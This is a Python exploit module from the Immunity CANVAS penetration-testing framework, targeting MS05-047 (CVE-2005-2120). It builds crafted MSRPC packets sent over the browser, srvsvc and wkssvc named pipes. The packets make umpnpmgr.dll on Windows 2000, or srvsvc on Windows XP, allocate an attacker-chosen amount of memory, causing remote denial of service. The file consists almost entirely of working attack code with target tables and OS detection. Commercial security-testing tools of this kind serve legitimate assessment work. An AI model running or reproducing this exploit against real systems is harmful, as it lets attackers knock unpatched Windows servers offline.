#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2003
#http://www.immunityinc.com/CANVAS/ for more information

#Part of CANVAS For licensing information, please refer to your
#Immunity CANVAS licensing documentation


import sys
if "." not in sys.path: sys.path.append(".")

from exploitutils import *
from libs.dcemarshall import *
from msrpcexploit import msrpcexploit
import canvasengine

# GUI info
NAME="umpnp_dos (MS05-047)"
DESCRIPTION="umpnpmgr.dll/srvsvc memory exhaustion via msrpc" 
DOCUMENTATION={}
DOCUMENTATION['VENDOR']="Microsoft"
DOCUMENTATION["CVE Name"] = "CVE-2005-2120"
DOCUMENTATION["CVE Url"] = "http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-2120"
DOCUMENTATION['CVSS'] = 6.5

VERSION="0.1"

PROPERTY = {}
PROPERTY['TYPE'] = "DoS"
PROPERTY['SITE'] = "Remote"
PROPERTY['ARCH'] = [ ["Windows"]]
PROPERTY['VERSION'] = [ "2000" ]
PROPERTY['MSADV'] = "MS05-047" #none yet
GTK2_DIALOG="dialog.glade2"
CHANGELOG="""

"""

NOTES="""



"""

runAnExploit_gtk2 = canvasengine.runAnExploit_gtk2
runExploit = canvasengine.runExploit
# info, where, restore
# define these according to targets
WIN2K = 1
WINNT4 = 4
XP=2
targets = {
    0 : ["Autoversioning N/A",  0, 0],     
    WIN2K : ["Windows 2000 Server SP4 (English)", 0x01020304], 
    XP : ["Windows XP SP2 and below", 0x01020304] 
}

class theexploit(msrpcexploit):
    def __init__(self):
        msrpcexploit.__init__(self)
        self.name           = NAME
        self.covertness     = 0
        self.port           = 0
        self.host           = "192.168.0.6"
        self.localhost      = "192.168.0.2"
        self.localport      = 5555
        self.version        = 0
        self.badstring      = "\x00\\" #/.:$"# \\/.:$"
        self.UUID           = u"8d9f4e40-a03d-11ce-8f69-08003e30051b"
        self.uuidversion    = u"1.0"
        self.targetfunction = 10
        self.autoversion    = 1
        self.response       = 1
        self.memorysize     = 0x00f0ff10
        self.sleeptime      = 10
        
    def testOS(self):
        app = self.engine.getModuleExploit("osdetect")
        app.link(self)
        print "target=%s->%s"%(self.target,app.target)
        result=app.run()
        if result == 0:
            self.log("Unknown OS, automatic detection failed (try choosing a version)")
            return 0
        if app.result.find("2000") > -1:
            self.version = WIN2K
            return 1
        elif app.result.find("XP") > -1:
            self.version = XP
            return 1
        else:
            self.log("OS not vulnerable: %s" % result)
        return 0
    
    def neededListenerTypes(self):
        return []

    def buildConnectionList(self):
        host=self.host
        if self.version==XP:
            self.UUID = u"4b324fc8-1670-01d3-1278-5a47bf6ee188" #srvsvc
            self.uuidversion = u"3.0"
            self.targetfunction = 0x30
            
        connectionList = ["ncacn_np:%s[\\browser]"% (host),
                          "ncacn_np:%s[\\srvsvc]"% (host),
                          "ncacn_np:%s[\\wkssvc]"% (host),]
        
        self.connectionList = connectionList
        return self.connectionList
    
    def parseResponse(self,pkt):
        """
        Sometimes it returns interesting data
        """
        response = pkt
        response = response.replace("\x00","")[:5000]
        self.log("Response: %s" % prettyprint(response))
    
    def buildDcePacket(self):
        "Creates the packet for the msrpc function "
        description, retadd=targets[self.version]
        self.memorysize = dInt(self.argsDict.get("memorysize",self.memorysize))
        self.sleeptime = dInt(self.argsDict.get("sleeptime",self.sleeptime))
        self.log("Using memorysize: %8.8x" % self.memorysize)
        pkt = ""
        data = ""
        """
        long  Function_0a( [in] [unique]  [string] wchar_t * element_33,
          [size_is(*element_35)] [out]  wchar_t  element_34,
          [in,out]  long * element_35,
          [in]  long  element_36
        );

        """
        if self.version == WIN2K:
            self.log("Building WIN2K attack")
            size=334
            #buffer="ACPI\\" +"\\"*size+"FixedButton\\"+"\\"*50000
            buffer="A"*1280
            data += intel_order(0x00) #null ptr value
            #data += s_dce_win2k_unistring(buffer) #no string anymore
            #data += s_dce_win2k_unistring(buffer)
            data += intel_order(self.memorysize) #size
            data += intel_order(0x0) #input for if statement integer
            print "Buffer: %s"%prettyprint(data)
            pkt=data
        else:
            # assume XP
            self.log("Building XP attack")
            """
            long  Function_30( [in] [unique]  [string] wchar_t * element_608,
            [in]  TYPE_33 * element_609,
            [in]  [string] wchar_t *  element_610,
            [in]  long  element_611,
            [in]  long  element_612,
            [size_is(element_612)] [out]  wchar_t  element_613
            );
            """
            marshaller=dcemarshaller()
            self.marshaller=marshaller
            marshaller.define("""
              typedef   struct {
              long element_581;
              short element_582;
              short element_583;
              [size_is(8)] byte element_584; /*really a byte b[8] */
              } TYPE_33;
            """)
            e608=wchar_t(None,["[unique]"],marshaller)
            
            e609=marshaller.getinstance("TYPE_33")
            e609.setmember("element_581",dceint(0x01020304))
            e609.setmember("element_582",dceshort(0x0506))
            e609.setmember("element_583",dceshort(0x0708))
            e584=dcebyte(0xff,marshaller)
            myarray=dcearray([e584]*8,[],marshaller)
            myarray.staticsize=1;
            e609.setmember("element_584",myarray);

            e610=wchar_t("h\x00i\x00",[],marshaller)
            e611=dceint(0x99999999L,[],marshaller)
            e612=dceint(self.memorysize,[],marshaller) #size_is
            data+=e608.marshall()
            data+=e609.marshall()
            data+=e610.marshall()
            data+=e611.marshall()
            data+=e612.marshall()
            self.log("Sending :\n%s"%prettyhexprint(data))
            pkt=data
        return pkt

    def displayVersions(self):
        i = 0
        for listline in targets.values():
            print "%d : %s"% (i, listline[0])
            i = i + 1
    
if __name__== '__main__':
    app = theexploit()
    ret=standard_callback_commandline(app)


    
